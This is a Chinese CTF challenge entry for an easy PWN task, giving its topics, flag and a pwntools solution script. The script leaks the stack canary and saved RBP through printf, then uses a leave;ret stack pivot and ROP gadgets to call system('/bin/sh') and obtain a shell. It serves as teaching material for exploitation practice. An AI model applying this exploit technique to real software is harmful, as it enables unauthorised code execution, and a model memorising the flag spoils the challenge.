- **题目名称：** I_want_2_LEAVE
- **题目类型：** PWN
- **题目难度：**简单
- **出题人：** i-Corner
- **考点：**

1. printf函数的输出终止情况
2. leave_ret 栈迁移

- **描述：** 呜呜呜呜CTF好难，想跑路了
- **flag：** XSCTF{CS2's_strafing_is_a_piece_of_s***}
- **Writeup：**

```python
from pwn import *
context(log_level='debug')
p = process('./b')
leave_ret = 0x401351
pop_rdi_ret = 0x4014d3

elf = ELF('./b')
p.recvuntil("what do you want to say?\n")

p.send(b'a'*0x40+p32(0xFFFFFFF1)+b'a'*0x3+b'b')
p.recvuntil('b')
can = p.recv(8)
rbp = u64(p.recv(6)+b'\x00'*2)

log.success("Canary:%s"%can)
log.success("RBP:0x%x"%rbp)

p.recvuntil("what do you want to say?\n")

system = 0x4012CC

pl = b'a'*0x8 +p64(pop_rdi_ret)+p64(rbp-0x70+4*0x8)+p64(system)+b'/bin/sh\x00'
pl = pl.ljust(0x48,b'a')
pl +=can+p64(rbp-0x70)+p64(leave_ret)
p.send(pl)


p.interactive()

```
